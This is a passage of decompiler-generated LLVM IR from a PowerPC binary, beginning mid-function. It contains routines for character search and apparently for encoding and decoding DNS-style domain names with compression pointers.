  %v5_1000d014 = sext i16 %v4_1000d014 to i32
  ret i32 %v5_1000d014

; uselistorder directives
  uselistorder i32 128, { 11, 0, 1, 21, 22, 4, 6, 12, 5, 13, 7, 14, 15, 3, 16, 8, 17, 18, 19, 2, 9, 10, 20 }
}

define i32 @function_1000d01c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d01c:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000d01c = urem i32 %arg1, 256
  store i32 %v1_1000d01c, i32* %r4.global-to-local, align 4
  %v0_1000d03c2 = load i32, i32* @r3, align 4
  %v1_1000d03c3 = urem i32 %v0_1000d03c2, 4
  %v3_1000d03c5 = icmp eq i32 %v1_1000d03c3, 0
  br i1 %v3_1000d03c5, label %dec_label_pc_1000d044, label %dec_label_pc_1000d024

dec_label_pc_1000d024:                            ; preds = %dec_label_pc_1000d01c, %dec_label_pc_1000d038
  %v1_1000d028 = phi i32 [ %v0_1000d044.pre, %dec_label_pc_1000d038 ], [ %v1_1000d01c, %dec_label_pc_1000d01c ]
  %v0_1000d024 = phi i32 [ %v1_1000d038, %dec_label_pc_1000d038 ], [ %v0_1000d03c2, %dec_label_pc_1000d01c ]
  %v1_1000d024 = inttoptr i32 %v0_1000d024 to i8*
  %v2_1000d024 = load i8, i8* %v1_1000d024, align 1
  %v3_1000d024 = zext i8 %v2_1000d024 to i32
  %v4_1000d028 = icmp eq i32 %v3_1000d024, %v1_1000d028
  %v3_1000d02c = icmp eq i8 %v2_1000d024, 0
  %v0_1000d030 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d028, i32 %v0_1000d030)
  br i1 %v3_1000d02c, label %dec_label_pc_1000d114, label %dec_label_pc_1000d038

dec_label_pc_1000d038:                            ; preds = %dec_label_pc_1000d024
  %v0_1000d038 = load i32, i32* @r3, align 4
  %v1_1000d038 = add i32 %v0_1000d038, 1
  store i32 %v1_1000d038, i32* @r3, align 4
  %v1_1000d03c = urem i32 %v1_1000d038, 4
  %v3_1000d03c = icmp eq i32 %v1_1000d03c, 0
  %v0_1000d044.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000d03c, label %dec_label_pc_1000d044, label %dec_label_pc_1000d024

dec_label_pc_1000d044:                            ; preds = %dec_label_pc_1000d038, %dec_label_pc_1000d01c
  %v0_1000d05c10 = phi i32 [ %v0_1000d03c2, %dec_label_pc_1000d01c ], [ %v1_1000d038, %dec_label_pc_1000d038 ]
  %v0_1000d044 = phi i32 [ %v1_1000d01c, %dec_label_pc_1000d01c ], [ %v0_1000d044.pre, %dec_label_pc_1000d038 ]
  %v1_1000d044 = mul i32 %v0_1000d044, 256
  %v2_1000d04c = or i32 %v1_1000d044, %v0_1000d044
  %v1_1000d054 = mul i32 %v2_1000d04c, 65536
  %v2_1000d058 = or i32 %v1_1000d054, %v2_1000d04c
  br label %dec_label_pc_1000d05c

dec_label_pc_1000d05c:                            ; preds = %dec_label_pc_1000d05c, %dec_label_pc_1000d110, %dec_label_pc_1000d044
  %v0_1000d0b4 = phi i32 [ %v0_1000d05c10, %dec_label_pc_1000d044 ], [ %v1_1000d060, %dec_label_pc_1000d110 ], [ %v1_1000d060, %dec_label_pc_1000d05c ]
  %v1_1000d05c = inttoptr i32 %v0_1000d0b4 to i32*
  %v2_1000d05c = load i32, i32* %v1_1000d05c, align 4
  %v1_1000d060 = add i32 %v0_1000d0b4, 4
  %v2_1000d068 = xor i32 %v2_1000d05c, %v2_1000d058
  %v1_1000d074 = add i32 %v2_1000d05c, 2130640639
  %v1_1000d078 = add i32 %v2_1000d068, 2130640639
  %v2_1000d07c = xor i32 %v1_1000d074, %v2_1000d05c
  %v2_1000d080 = xor i32 %v1_1000d078, %v2_1000d068
  %v2_1000d084 = and i32 %v2_1000d07c, -2130640640
  %v3_1000d084 = xor i32 %v2_1000d084, -2130640640
  %v2_1000d088 = and i32 %v2_1000d080, -2130640640
  %v3_1000d088 = xor i32 %v2_1000d088, -2130640640
  %tmp = or i32 %v3_1000d088, %v3_1000d084
  %tmp16 = icmp eq i32 %tmp, 0
  br i1 %tmp16, label %dec_label_pc_1000d05c, label %dec_label_pc_1000d098

dec_label_pc_1000d098:                            ; preds = %dec_label_pc_1000d05c
  %v2_1000d098 = inttoptr i32 %v0_1000d0b4 to i8*
  %v3_1000d098 = load i8, i8* %v2_1000d098, align 1
  %v4_1000d098 = zext i8 %v3_1000d098 to i32
  %v1_1000d09c = add i32 %v0_1000d0b4, 1
  %v1_1000d0a0 = add i32 %v0_1000d0b4, 2
  %v1_1000d0a4 = add i32 %v0_1000d0b4, 3
  %v4_1000d0a8 = icmp eq i32 %v4_1000d098, %v0_1000d044
  br i1 %v4_1000d0a8, label %dec_label_pc_1000d0b4, label %dec_label_pc_1000d0bc

dec_label_pc_1000d0b4:                            ; preds = %dec_label_pc_1000d098
  ret i32 %v0_1000d0b4

dec_label_pc_1000d0bc:                            ; preds = %dec_label_pc_1000d098
  %v3_1000d0ac = icmp eq i8 %v3_1000d098, 0
  br i1 %v3_1000d0ac, label %dec_label_pc_1000d114, label %dec_label_pc_1000d0c0

dec_label_pc_1000d0c0:                            ; preds = %dec_label_pc_1000d0bc
  %v2_1000d0c0 = inttoptr i32 %v1_1000d09c to i8*
  %v3_1000d0c0 = load i8, i8* %v2_1000d0c0, align 1
  %v4_1000d0c0 = zext i8 %v3_1000d0c0 to i32
  %v4_1000d0c4 = icmp eq i32 %v4_1000d0c0, %v0_1000d044
  br i1 %v4_1000d0c4, label %dec_label_pc_1000d0d0, label %dec_label_pc_1000d0d8

dec_label_pc_1000d0d0:                            ; preds = %dec_label_pc_1000d0c0
  ret i32 %v1_1000d09c

dec_label_pc_1000d0d8:                            ; preds = %dec_label_pc_1000d0c0
  %v3_1000d0c8 = icmp eq i8 %v3_1000d0c0, 0
  br i1 %v3_1000d0c8, label %dec_label_pc_1000d114, label %dec_label_pc_1000d0dc

dec_label_pc_1000d0dc:                            ; preds = %dec_label_pc_1000d0d8
  %v2_1000d0dc = inttoptr i32 %v1_1000d0a0 to i8*
  %v3_1000d0dc = load i8, i8* %v2_1000d0dc, align 1
  %v4_1000d0dc = zext i8 %v3_1000d0dc to i32
  %v4_1000d0e0 = icmp eq i32 %v4_1000d0dc, %v0_1000d044
  br i1 %v4_1000d0e0, label %dec_label_pc_1000d0ec, label %dec_label_pc_1000d0f4

dec_label_pc_1000d0ec:                            ; preds = %dec_label_pc_1000d0dc
  ret i32 %v1_1000d0a0

dec_label_pc_1000d0f4:                            ; preds = %dec_label_pc_1000d0dc
  %v3_1000d0e4 = icmp eq i8 %v3_1000d0dc, 0
  br i1 %v3_1000d0e4, label %dec_label_pc_1000d114, label %dec_label_pc_1000d0f8

dec_label_pc_1000d0f8:                            ; preds = %dec_label_pc_1000d0f4
  %v2_1000d0f8 = inttoptr i32 %v1_1000d0a4 to i8*
  %v3_1000d0f8 = load i8, i8* %v2_1000d0f8, align 1
  %v4_1000d0f8 = zext i8 %v3_1000d0f8 to i32
  %v4_1000d0fc = icmp eq i32 %v4_1000d0f8, %v0_1000d044
  br i1 %v4_1000d0fc, label %dec_label_pc_1000d108, label %dec_label_pc_1000d110

dec_label_pc_1000d108:                            ; preds = %dec_label_pc_1000d0f8
  ret i32 %v1_1000d0a4

dec_label_pc_1000d110:                            ; preds = %dec_label_pc_1000d0f8
  %v3_1000d100 = icmp eq i8 %v3_1000d0f8, 0
  br i1 %v3_1000d100, label %dec_label_pc_1000d114, label %dec_label_pc_1000d05c

dec_label_pc_1000d114:                            ; preds = %dec_label_pc_1000d024, %dec_label_pc_1000d110, %dec_label_pc_1000d0f4, %dec_label_pc_1000d0d8, %dec_label_pc_1000d0bc
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d060, { 1, 0 }
  uselistorder i32 %v2_1000d05c, { 0, 2, 1 }
  uselistorder i32 %v0_1000d0b4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_1000d04c, { 1, 0 }
  uselistorder i32 %v0_1000d044, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000d038, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000d03c2, { 2, 1, 0 }
  uselistorder i32 %v1_1000d01c, { 1, 2, 0 }
  uselistorder i32 3, { 1, 38, 39, 40, 41, 42, 43, 44, 18, 45, 2, 54, 3, 0, 10, 19, 28, 63, 31, 21, 20, 12, 22, 46, 11, 47, 4, 48, 49, 55, 56, 23, 57, 58, 16, 15, 5, 14, 29, 30, 52, 53, 17, 37, 6, 7, 50, 8, 9, 59, 60, 68, 69, 70, 64, 65, 66, 67, 13, 62, 61, 51, 24, 32, 33, 25, 34, 35, 26, 36, 27 }
  uselistorder i32 -2130640640, { 3, 4, 5, 6, 0, 7, 2, 9, 1, 8 }
  uselistorder i32 65536, { 0, 1, 20, 2, 3, 4, 5, 7, 6, 8, 21, 9, 10, 11, 13, 12, 14, 15, 18, 16, 19, 17 }
  uselistorder i32 4, { 169, 5, 6, 7, 94, 111, 8, 9, 172, 170, 171, 117, 173, 174, 175, 105, 10, 176, 177, 178, 179, 180, 181, 182, 11, 183, 12, 13, 14, 112, 184, 185, 118, 187, 186, 15, 16, 106, 139, 17, 18, 232, 233, 234, 235, 236, 237, 205, 119, 19, 20, 270, 271, 120, 21, 22, 99, 23, 24, 25, 26, 27, 28, 188, 189, 121, 29, 30, 2, 31, 0, 238, 3, 32, 1, 190, 122, 33, 206, 207, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 272, 251, 100, 286, 293, 34, 35, 36, 37, 38, 273, 274, 39, 275, 40, 276, 41, 42, 133, 43, 44, 134, 45, 151, 152, 153, 214, 215, 216, 46, 135, 47, 48, 49, 136, 50, 137, 138, 219, 221, 220, 217, 218, 140, 141, 142, 143, 222, 223, 224, 225, 226, 227, 228, 229, 230, 116, 191, 123, 192, 193, 101, 51, 52, 194, 53, 195, 196, 197, 198, 199, 200, 107, 54, 201, 277, 278, 252, 55, 56, 57, 108, 58, 114, 59, 109, 110, 60, 113, 253, 61, 62, 287, 288, 289, 124, 290, 291, 292, 63, 279, 280, 281, 97, 98, 282, 283, 125, 284, 285, 64, 202, 65, 66, 67, 68, 69, 70, 71, 254, 72, 255, 256, 73, 257, 258, 259, 260, 261, 74, 75, 262, 263, 76, 264, 265, 77, 266, 267, 269, 78, 79, 95, 96, 268, 208, 80, 209, 126, 210, 145, 146, 147, 115, 4, 148, 149, 150, 211, 212, 127, 81, 82, 144, 83, 84, 85, 86, 87, 102, 88, 89, 154, 155, 128, 156, 157, 158, 129, 159, 90, 160, 161, 162, 130, 163, 164, 165, 166, 167, 168, 203, 131, 204, 103, 91, 213, 104, 92, 231, 93, 132 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 45, 51, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 44, 18, 19, 20, 21, 22, 23, 24, 25, 55, 26, 56, 57, 58, 27, 28, 29, 30, 31, 52, 46, 32, 33, 53, 34, 35, 54, 36, 37, 38, 39, 40, 41, 42, 43, 47, 48, 49, 50 }
  uselistorder label %dec_label_pc_1000d114, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000d05c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d024, { 1, 0 }
}

define i32 @function_1000d11c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000d11c:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000d120 = load i32, i32* @lr, align 4
  store i32 %v0_1000d120, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000d12c = load i32, i32* @r4, align 4
  store i32 %v0_1000d12c, i32* @r29, align 4
  %v0_1000d130 = load i32, i32* @r5, align 4
  store i32 %v0_1000d130, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000d19c13 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000d19c13, label %dec_label_pc_1000d1b8, label %dec_label_pc_1000d1ac

dec_label_pc_1000d140:                            ; preds = %dec_label_pc_1000d1ac
  store i32 268489028, i32* @lr, align 4
  %v3_1000d140 = call i32 @function_1000d01c(i32 %v0_1000d1ac14, i32 46)
  store i32 %v3_1000d140, i32* @r30, align 4
  %v3_1000d144 = icmp eq i32 %v3_1000d140, 0
  %v0_1000d148 = load i32, i32* @r31, align 4
  store i32 %v0_1000d148, i32* @r3, align 4
  %v2_1000d14c = sub i32 %v3_1000d140, %v0_1000d148
  store i32 %v2_1000d14c, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d144, label %dec_label_pc_1000d154, label %dec_label_pc_1000d15c

dec_label_pc_1000d154:                            ; preds = %dec_label_pc_1000d140
  %v0_1000d154 = call i32 @function_10007284()
  store i32 %v0_1000d154, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000d154, 16777216
  %v1_1000d158 = sdiv i32 %sext, 16777216
  store i32 %v1_1000d158, i32* %r0.global-to-local, align 4
  %v0_1000d16c.pre = load i32, i32* @r31, align 4
  %v0_1000d17c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d15c

dec_label_pc_1000d15c:                            ; preds = %dec_label_pc_1000d140, %dec_label_pc_1000d154
  %v0_1000d17c = phi i32 [ %v3_1000d140, %dec_label_pc_1000d140 ], [ %v0_1000d17c.pre, %dec_label_pc_1000d154 ]
  %v0_1000d16c = phi i32 [ %v0_1000d148, %dec_label_pc_1000d140 ], [ %v0_1000d16c.pre, %dec_label_pc_1000d154 ]
  %v0_1000d188 = phi i32 [ %v2_1000d14c, %dec_label_pc_1000d140 ], [ %v1_1000d158, %dec_label_pc_1000d154 ]
  %v0_1000d15c = load i32, i32* @r28, align 4
  %v1_1000d15c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000d15c = sub i32 %v1_1000d15c, %v0_1000d15c
  %v1_1000d164 = add i32 %v0_1000d15c, 1
  store i32 %v1_1000d164, i32* %r11.global-to-local, align 4
  %v1_1000d168 = add i32 %v2_1000d15c, -1
  store i32 %v0_1000d16c, i32* @r4, align 4
  %v0_1000d170 = load i32, i32* @r29, align 4
  %v2_1000d170 = add i32 %v0_1000d170, %v1_1000d164
  store i32 %v2_1000d170, i32* @r3, align 4
  store i32 %v0_1000d188, i32* @r5, align 4
  %v2_1000d178 = icmp ult i32 %v0_1000d188, %v1_1000d168
  %v1_1000d17c = add i32 %v0_1000d17c, 1
  store i32 %v1_1000d17c, i32* @r31, align 4
  %v3_1000d160.not = icmp ne i32 %v0_1000d188, 0
  %or.cond = and i1 %v2_1000d178, %v3_1000d160.not
  br i1 %or.cond, label %dec_label_pc_1000d188, label %dec_label_pc_1000d1d0

dec_label_pc_1000d188:                            ; preds = %dec_label_pc_1000d15c
  %v3_1000d188 = trunc i32 %v0_1000d188 to i8
  %v4_1000d188 = add i32 %v0_1000d170, %v0_1000d15c
  %v5_1000d188 = inttoptr i32 %v4_1000d188 to i8*
  store i8 %v3_1000d188, i8* %v5_1000d188, align 1
  %v0_1000d18c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d18c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d18c = add i32 %v1_1000d18c, %v0_1000d18c
  store i32 %v2_1000d18c, i32* @r28, align 4
  store i32 268489108, i32* @lr, align 4
  %v0_1000d190 = call i32 @function_10007104()
  store i32 %v0_1000d190, i32* %r3.global-to-local, align 4
  %v0_1000d194 = load i32, i32* @r30, align 4
  %v3_1000d194 = icmp eq i32 %v0_1000d194, 0
  br i1 %v3_1000d194, label %dec_label_pc_1000d1b8, label %dec_label_pc_1000d188.dec_label_pc_1000d19c_crit_edge

dec_label_pc_1000d188.dec_label_pc_1000d19c_crit_edge: ; preds = %dec_label_pc_1000d188
  %v0_1000d19c.pre = load i32, i32* @r31, align 4
  %v3_1000d19c = icmp eq i32 %v0_1000d19c.pre, 0
  store i32 %v0_1000d19c.pre, i32* @r3, align 4
  br i1 %v3_1000d19c, label %dec_label_pc_1000d1b8, label %dec_label_pc_1000d1ac

dec_label_pc_1000d1ac:                            ; preds = %dec_label_pc_1000d11c, %dec_label_pc_1000d188.dec_label_pc_1000d19c_crit_edge
  %v0_1000d1ac14 = phi i32 [ %v0_1000d19c.pre, %dec_label_pc_1000d188.dec_label_pc_1000d19c_crit_edge ], [ %tmp, %dec_label_pc_1000d11c ]
  %v1_1000d1ac = inttoptr i32 %v0_1000d1ac14 to i8*
  %v2_1000d1ac = load i8, i8* %v1_1000d1ac, align 1
  %v3_1000d1ac = zext i8 %v2_1000d1ac to i32
  store i32 %v3_1000d1ac, i32* %r0.global-to-local, align 4
  %v3_1000d1b0 = icmp eq i8 %v2_1000d1ac, 0
  br i1 %v3_1000d1b0, label %dec_label_pc_1000d1b8, label %dec_label_pc_1000d140

dec_label_pc_1000d1b8:                            ; preds = %dec_label_pc_1000d188.dec_label_pc_1000d19c_crit_edge, %dec_label_pc_1000d188, %dec_label_pc_1000d1ac, %dec_label_pc_1000d11c
  %v0_1000d1b8 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000d1b8, 1
  br i1 %tmp10, label %dec_label_pc_1000d1d0, label %dec_label_pc_1000d1c0

dec_label_pc_1000d1c0:                            ; preds = %dec_label_pc_1000d1b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000d1c4 = load i32, i32* @r28, align 4
  %v1_1000d1c4 = add i32 %v0_1000d1c4, 1
  store i32 %v1_1000d1c4, i32* %r3.global-to-local, align 4
  %v1_1000d1c8 = load i32, i32* @r29, align 4
  %v4_1000d1c8 = add i32 %v1_1000d1c8, %v0_1000d1c4
  %v5_1000d1c8 = inttoptr i32 %v4_1000d1c8 to i8*
  store i8 0, i8* %v5_1000d1c8, align 1
  %v0_1000d1e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d1d4

dec_label_pc_1000d1d0:                            ; preds = %dec_label_pc_1000d15c, %dec_label_pc_1000d1b8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d1d4

dec_label_pc_1000d1d4:                            ; preds = %dec_label_pc_1000d1c0, %dec_label_pc_1000d1d0
  %v0_1000d1e4 = phi i32 [ %v0_1000d1e4.pre, %dec_label_pc_1000d1c0 ], [ -1, %dec_label_pc_1000d1d0 ]
  store i32 %v0_1000d120, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d1e4

; uselistorder directives
  uselistorder i32 %v0_1000d1ac14, { 1, 0 }
  uselistorder i32 %v0_1000d19c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000d188, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000d158, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @function_10007284, { 12, 41, 40, 20, 21, 13, 9, 10, 39, 19, 1, 18, 2, 38, 37, 36, 35, 3, 34, 7, 6, 33, 32, 31, 5, 4, 30, 29, 28, 27, 8, 26, 25, 24, 23, 22, 17, 0, 16, 14, 15, 11 }
  uselistorder i32 (i32, i32)* @function_1000d01c, { 0, 2, 1 }
  uselistorder i32 46, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder label %dec_label_pc_1000d1d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1b8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000d1ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000d15c, { 1, 0 }
}

define i32 @function_1000d1e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d1e8:
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000d1ec = call i32 @__asm_mfcr()
  store i32 %v0_1000d1ec, i32* @r26, align 4
  %v3_1000d1f8 = icmp eq i32 %v0_1000d1ec, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000d208 = load i32, i32* @r6, align 4
  store i32 %v0_1000d208, i32* @r24, align 4
  br i1 %v3_1000d1f8, label %dec_label_pc_1000d2c0, label %dec_label_pc_1000d210

dec_label_pc_1000d210:                            ; preds = %dec_label_pc_1000d1e8
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000d29c14 = load i32, i32* @r4, align 4
  %v2_1000d29c15 = add i32 %v1_1000d29c14, %v0_1000d1ec
  %v3_1000d29c16 = inttoptr i32 %v2_1000d29c15 to i8*
  %v4_1000d29c17 = load i8, i8* %v3_1000d29c16, align 1
  %v5_1000d29c18 = zext i8 %v4_1000d29c17 to i32
  store i32 %v5_1000d29c18, i32* @r31, align 4
  store i1 false, i1* @cr4_eq, align 1
  %v3_1000d2a420 = icmp eq i8 %v4_1000d29c17, 0
  br i1 %v3_1000d2a420, label %dec_label_pc_1000d2b0, label %dec_label_pc_1000d220

dec_label_pc_1000d220:                            ; preds = %dec_label_pc_1000d210, %dec_label_pc_1000d298
  %v3_1000d2a022 = phi i1 [ %v3_1000d2a0, %dec_label_pc_1000d298 ], [ false, %dec_label_pc_1000d210 ]
  %v5_1000d29c21 = phi i32 [ %v5_1000d29c, %dec_label_pc_1000d298 ], [ %v5_1000d29c18, %dec_label_pc_1000d210 ]
  br i1 %v3_1000d2a022, label %dec_label_pc_1000d228, label %dec_label_pc_1000d224

dec_label_pc_1000d224:                            ; preds = %dec_label_pc_1000d220
  %v0_1000d224 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000d224 = add i32 %v0_1000d224, 1
  store i32 %v1_1000d224, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000d228

dec_label_pc_1000d228:                            ; preds = %dec_label_pc_1000d220, %dec_label_pc_1000d224
  %v1_1000d228 = call i32 @__asm_rlwinm(i32 %v5_1000d29c21, i32 0, i32 24, i32 25)
  %v0_1000d22c = load i32, i32* @r4, align 4
  %v1_1000d22c = add i32 %v0_1000d22c, 1
  store i32 %v1_1000d22c, i32* @r30, align 4
  %v3_1000d230 = icmp eq i32 %v1_1000d228, 192
  br i1 %v3_1000d230, label %dec_label_pc_1000d238, label %dec_label_pc_1000d258

dec_label_pc_1000d238:                            ; preds = %dec_label_pc_1000d228
  %v0_1000d238 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000d238, label %dec_label_pc_1000d240, label %dec_label_pc_1000d23c

dec_label_pc_1000d23c:                            ; preds = %dec_label_pc_1000d238
  %v0_1000d23c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000d23c = add i32 %v0_1000d23c, 1
  store i32 %v1_1000d23c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000d240

dec_label_pc_1000d240:                            ; preds = %dec_label_pc_1000d238, %dec_label_pc_1000d23c
  %v0_1000d240 = load i32, i32* @r26, align 4
  %v2_1000d240 = add i32 %v0_1000d240, %v1_1000d22c
  %v3_1000d240 = inttoptr i32 %v2_1000d240 to i8*
  %v4_1000d240 = load i8, i8* %v3_1000d240, align 1
  %v5_1000d240 = zext i8 %v4_1000d240 to i32
  %v1_1000d244 = call i32 @__asm_rlwinm(i32 %v5_1000d29c21, i32 8, i32 18, i32 23)
  %v0_1000d248 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000d248, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000d250 = or i32 %v5_1000d240, %v1_1000d244
  store i32 %v2_1000d250, i32* @r4, align 4
  br label %dec_label_pc_1000d298

dec_label_pc_1000d258:                            ; preds = %dec_label_pc_1000d228
  %v0_1000d258 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d258 = add i32 %v0_1000d258, %v5_1000d29c21
  store i32 %v2_1000d258, i32* @r29, align 4
  %v1_1000d25c = add i32 %v2_1000d258, 1
  store i32 %v1_1000d25c, i32* @r28, align 4
  %v1_1000d260 = load i32, i32* @r24, align 4
  %v2_1000d260 = icmp ult i32 %v1_1000d25c, %v1_1000d260
  br i1 %v2_1000d260, label %dec_label_pc_1000d268, label %dec_label_pc_1000d2c0

dec_label_pc_1000d268:                            ; preds = %dec_label_pc_1000d258
  %v0_1000d268 = load i32, i32* @r26, align 4
  %v2_1000d268 = add i32 %v0_1000d268, %v1_1000d22c
  store i32 %v2_1000d268, i32* @r4, align 4
  %v0_1000d26c = load i32, i32* @r25, align 4
  %v2_1000d26c = add i32 %v0_1000d26c, %v0_1000d258
  store i32 %v2_1000d26c, i32* @r3, align 4
  store i32 %v5_1000d29c21, i32* @r5, align 4
  store i32 268489336, i32* @lr, align 4
  %v0_1000d274 = call i32 @function_10007104()
  %v0_1000d278 = load i32, i32* @r30, align 4
  %v2_1000d278 = add i32 %v0_1000d278, %v5_1000d29c21
  store i32 %v2_1000d278, i32* @r4, align 4
  %v0_1000d27c = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000d27c, label %dec_label_pc_1000d284, label %dec_label_pc_1000d280

dec_label_pc_1000d280:                            ; preds = %dec_label_pc_1000d268
  %v0_1000d280 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000d280 = add i32 %v0_1000d280, %v5_1000d29c21
  store i32 %v2_1000d280, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000d284

dec_label_pc_1000d284:                            ; preds = %dec_label_pc_1000d268, %dec_label_pc_1000d280
  %v0_1000d284 = load i32, i32* @r26, align 4
  %v2_1000d284 = add i32 %v0_1000d284, %v2_1000d278
  %v3_1000d284 = inttoptr i32 %v2_1000d284 to i8*
  %v4_1000d284 = load i8, i8* %v3_1000d284, align 1
  %v3_1000d288 = icmp eq i8 %v4_1000d284, 0
  br i1 %v3_1000d288, label %dec_label_pc_1000d294, label %dec_label_pc_1000d290

dec_label_pc_1000d290:                            ; preds = %dec_label_pc_1000d284
  br label %dec_label_pc_1000d294

dec_label_pc_1000d294:                            ; preds = %dec_label_pc_1000d284, %dec_label_pc_1000d290
  %v0_1000d294.off0 = phi i8 [ 0, %dec_label_pc_1000d284 ], [ 46, %dec_label_pc_1000d290 ]
  %v1_1000d294 = load i32, i32* @r25, align 4
  %v2_1000d294 = load i32, i32* @r29, align 4
  %v4_1000d294 = add i32 %v2_1000d294, %v1_1000d294
  %v5_1000d294 = inttoptr i32 %v4_1000d294 to i8*
  store i8 %v0_1000d294.off0, i8* %v5_1000d294, align 1
  %v0_1000d298.pre = load i32, i32* @r28, align 4
  %v0_1000d2a0.pre.pre = load i32, i32* @r23, align 4
  %v1_1000d29c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000d298

dec_label_pc_1000d298:                            ; preds = %dec_label_pc_1000d240, %dec_label_pc_1000d294
  %v1_1000d29c = phi i32 [ %v2_1000d250, %dec_label_pc_1000d240 ], [ %v1_1000d29c.pre, %dec_label_pc_1000d294 ]
  %v0_1000d2a0.pre = phi i32 [ 0, %dec_label_pc_1000d240 ], [ %v0_1000d2a0.pre.pre, %dec_label_pc_1000d294 ]
  %v0_1000d298 = phi i32 [ %v0_1000d248, %dec_label_pc_1000d240 ], [ %v0_1000d298.pre, %dec_label_pc_1000d294 ]
  %v0_1000d29c.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000d298, i32* %r11.global-to-local, align 4
  %v2_1000d29c = add i32 %v1_1000d29c, %v0_1000d29c.pre
  %v3_1000d29c = inttoptr i32 %v2_1000d29c to i8*
  %v4_1000d29c = load i8, i8* %v3_1000d29c, align 1
  %v5_1000d29c = zext i8 %v4_1000d29c to i32
  store i32 %v5_1000d29c, i32* @r31, align 4
  %v3_1000d2a0 = icmp eq i32 %v0_1000d2a0.pre, 0
  store i1 %v3_1000d2a0, i1* @cr4_eq, align 1
  %v3_1000d2a4 = icmp eq i8 %v4_1000d29c, 0
  br i1 %v3_1000d2a4, label %dec_label_pc_1000d2ac, label %dec_label_pc_1000d220

dec_label_pc_1000d2ac:                            ; preds = %dec_label_pc_1000d298
  %v0_1000d2b4.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000d2a0, label %dec_label_pc_1000d2c0, label %dec_label_pc_1000d2b0

dec_label_pc_1000d2b0:                            ; preds = %dec_label_pc_1000d210, %dec_label_pc_1000d2ac
  %v0_1000d2b4.pre26 = phi i32 [ %v0_1000d2b4.pre.pre, %dec_label_pc_1000d2ac ], [ 0, %dec_label_pc_1000d210 ]
  %v1_1000d2b0 = add i32 %v0_1000d2b4.pre26, 1
  store i32 %v1_1000d2b0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000d2c0

dec_label_pc_1000d2c0:                            ; preds = %dec_label_pc_1000d258, %dec_label_pc_1000d2ac, %dec_label_pc_1000d2b0, %dec_label_pc_1000d1e8
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000d1e8 ], [ %v1_1000d2b0, %dec_label_pc_1000d2b0 ], [ %v0_1000d2b4.pre.pre, %dec_label_pc_1000d2ac ], [ -1, %dec_label_pc_1000d258 ]
  %v1_1000d2d4 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000d1ec)
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000d2b4.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000d2a0, { 0, 2, 1 }
